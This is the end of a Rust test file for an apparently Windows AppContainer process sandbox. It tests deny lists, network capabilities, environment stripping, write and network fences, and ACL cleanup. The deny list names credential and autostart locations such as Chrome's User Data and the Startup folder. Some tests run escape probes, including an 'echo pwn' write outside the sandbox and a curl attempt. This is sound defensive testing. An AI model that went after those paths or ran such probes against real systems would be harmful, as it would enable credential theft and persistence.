    assert_eq!(kind_of(".zshrc"), Some(DenyKind::Persist));
    // `Library/...` is the Keychain, the macOS browser profiles and LaunchAgents — nothing on
    // Windows maps onto it, and guessing would hang a deny ACE off an unrelated path.
    assert!(
        !mapped.iter().any(|(p, _)| p.contains("Keychains")),
        "macOS-only entry leaked into the Windows list: {mapped:?}"
    );
    assert!(
        !mapped.iter().any(|(p, _)| p.contains("LaunchAgents")),
        "macOS-only entry leaked into the Windows list: {mapped:?}"
    );
    // Windows equivalents the shared list cannot name
    assert_eq!(
        kind_of("AppData/Local/Google/Chrome/User Data"),
        Some(DenyKind::Secret)
    );
    assert_eq!(
        kind_of("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"),
        Some(DenyKind::Persist),
        "the per-user Startup folder is the Windows LaunchAgent"
    );
}

/// An AppContainer token with no capabilities has no sockets at all — that is the fence, so
/// the capability list is the whole network policy.
#[test]
fn appcontainer_capabilities_gate_the_network() {
    assert!(capabilities_for(Mode::Strict, false).is_empty());
    assert_eq!(capabilities_for(Mode::Strict, true), &[INTERNET_CLIENT_SID]);
    assert_eq!(
        capabilities_for(Mode::Installer, false),
        &[INTERNET_CLIENT_SID]
    );
}

/// `--print-profile` is the review artifact for the deny list; it has to show the grants and,
/// in installer mode, the denies and their labels.
#[test]
fn appcontainer_plan_lists_grants_and_installer_denies() {
    let scratch = PathBuf::from("/tmp/scratch");
    let home = PathBuf::from("/tmp/home");
    let strict = profile_plan(Mode::Strict, false, &scratch, &[], Some(&home));
    assert!(strict.contains("capabilities: none"), "{strict}");
    assert!(
        strict.contains(&format!("+ {}", scratch.display())),
        "{strict}"
    );
    assert!(!strict.contains("deny GENERIC_ALL"), "{strict}");

    let installer = profile_plan(Mode::Installer, true, &scratch, &[], Some(&home));
    assert!(installer.contains(INTERNET_CLIENT_SID), "{installer}");
    assert!(
        installer.contains(&format!("+ {}", home.display())),
        "{installer}"
    );
    assert!(installer.contains("deny GENERIC_ALL"), "{installer}");
    assert!(installer.contains("secret"), "{installer}");
    assert!(installer.contains("persist"), "{installer}");
}

/// The env policy now has a seam the Windows backend consumes directly (it hands
/// `CreateProcessW` a block, not a `Command`), so the decision half is asserted on its own:
/// `Clear` hands over exactly the documented allowlist, `Strip` never hands over a secret.
#[test]
fn env_policy_filter_shapes_the_variable_list() {
    const ALLOWLIST: &[&str] = &[
        "PATH", "HOME", "TMPDIR", "USER", "SHELL", "LANG", "LC_ALL", "TERM",
    ];
    let cleared: Vec<String> = filter_env(EnvPolicy::Clear)
        .into_iter()
        .map(|(k, _)| k.to_string_lossy().into_owned())
        .collect();
    assert!(
        cleared.iter().all(|k| ALLOWLIST.contains(&k.as_str())),
        "Clear must hand over only the allowlist, got {cleared:?}"
    );
    assert!(
        !filter_env(EnvPolicy::Strip)
            .iter()
            .any(|(k, _)| env_is_secret(&k.to_string_lossy())),
        "Strip must not leave a secret-looking variable in the block"
    );
}

// --- live AppContainer proofs (Windows only; the profile needs a real user session) ---

/// The profile is created once and reused; deriving its SID again must give the same answer, or
/// every ACL written by a previous run would be pointing at a principal that no longer exists.
/// The second derivation deliberately bypasses `profile_sid`'s process cache — comparing the
/// cache with itself would prove nothing about userenv.
#[cfg(windows)]
#[test]
fn appcontainer_profile_sid_is_stable_across_runs() {
    let first = match appcontainer::probe_backend() {
        Ok(()) => appcontainer::profile_sid_string().expect("SID after a successful probe"),
        Err(e) => {
            eprintln!("skip: no usable AppContainer profile on this machine ({e})");
            return;
        }
    };
    assert!(
        first.starts_with("S-1-15-2-"),
        "an AppContainer SID lives under the AppContainer authority: {first}"
    );
    let fresh = appcontainer::derive_profile_sid_uncached().expect("an uncached derivation");
    assert_eq!(
        first, fresh,
        "a fresh DeriveAppContainerSidFromAppContainerName must resolve the profile to the same SID"
    );
}

/// Exit code, stdout and stderr pass through the lowbox untouched — the AppContainer token
/// changes what the child may reach, not what it may report.
#[cfg(windows)]
#[test]
fn appcontainer_forwards_exit_code() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let before = unguarded_runs();
    assert_eq!(
        run_cli(&[
            "--".into(),
            "cmd".into(),
            "/c".into(),
            "exit".into(),
            "7".into()
        ]),
        7
    );

    assert_eq!(
        unguarded_runs(),
        before,
        "the run must not have degraded to the unguarded fallback"
    );
}

/// The write fence, end to end: a write to a path outside the scratch dir must not land on the
/// host. `%TEMP%` is the sharp target — it is the user's own directory and is not granted.
#[cfg(windows)]
#[test]
fn appcontainer_blocks_writes_outside_scratch() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let outside = std::env::temp_dir().join(format!("ocx-sandbox-deny-{}.txt", std::process::id()));
    let _ = std::fs::remove_file(&outside);
    let before = unguarded_runs();
    let code = run_cli(&[
        "--".into(),
        "cmd".into(),
        "/c".into(),
        format!("echo pwn>\"{}\"", outside.display()),
    ]);
    let leaked = outside.exists();
    let _ = std::fs::remove_file(&outside);
    assert_eq!(unguarded_runs(), before, "the run must not have degraded");
    assert_ne!(code, 0, "a write outside the scratch dir must fail");
    assert!(
        !leaked,
        "the sandbox must not let the write land on the host"
    );
}

/// The network fence: a lowbox token with no `internetClient` capability cannot open a socket,
/// not even to resolve. Skipped where the runner image ships no curl.
#[cfg(windows)]
#[test]
fn appcontainer_blocks_network() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    if std::process::Command::new("curl.exe")
        .arg("--version")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_err()
    {
        eprintln!("skip: no curl.exe on this machine");
        return;
    }
    let before = unguarded_runs();
    let code = run_cli(&[
        "--".into(),
        "curl.exe".into(),
        "-s".into(),
        "--max-time".into(),
        "5".into(),
        "https://example.com".into(),
    ]);
    assert_eq!(unguarded_runs(), before, "the run must not have degraded");
    assert_ne!(
        code, 0,
        "curl must not reach the network inside the sandbox"
    );
}

/// The cleanup contract: the ACE the run granted on a `--rw` directory is taken back out when
/// the run ends. A leftover ACE would hand the (profile-wide, stable) sandbox SID permanent
/// write access to a user directory.
#[cfg(windows)]
#[test]
fn appcontainer_revokes_the_grant_on_rw_dirs() {
    if !backend_ready() {
        eprintln!("skip: no sandbox backend on this machine");
        return;
    }
    let sid = match appcontainer::profile_sid_string() {
        Ok(s) => s,
        Err(e) => {
            eprintln!("skip: no usable AppContainer profile on this machine ({e})");
            return;
        }
    };
    let rw = std::env::temp_dir().join(format!("ocx-sandbox-rw-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&rw);
    std::fs::create_dir_all(&rw).unwrap();
    assert!(
        !appcontainer::acl_has_sid(&rw, &sid),
        "precondition: the directory starts without the sandbox SID"
    );
    let before = unguarded_runs();
    let code = run_cli(&[
        "--rw".into(),
        rw.to_string_lossy().into_owned(),
        "--".into(),
        "cmd".into(),
        "/c".into(),
        "echo hi".into(),
    ]);
    assert_eq!(unguarded_runs(), before, "the run must not have degraded");
    assert_eq!(code, 0, "the guarded run itself must succeed");
    assert!(
        !appcontainer::acl_has_sid(&rw, &sid),
        "the grant ACE must be gone from {} after the run",
        rw.display()
    );
    let _ = std::fs::remove_dir_all(&rw);
}
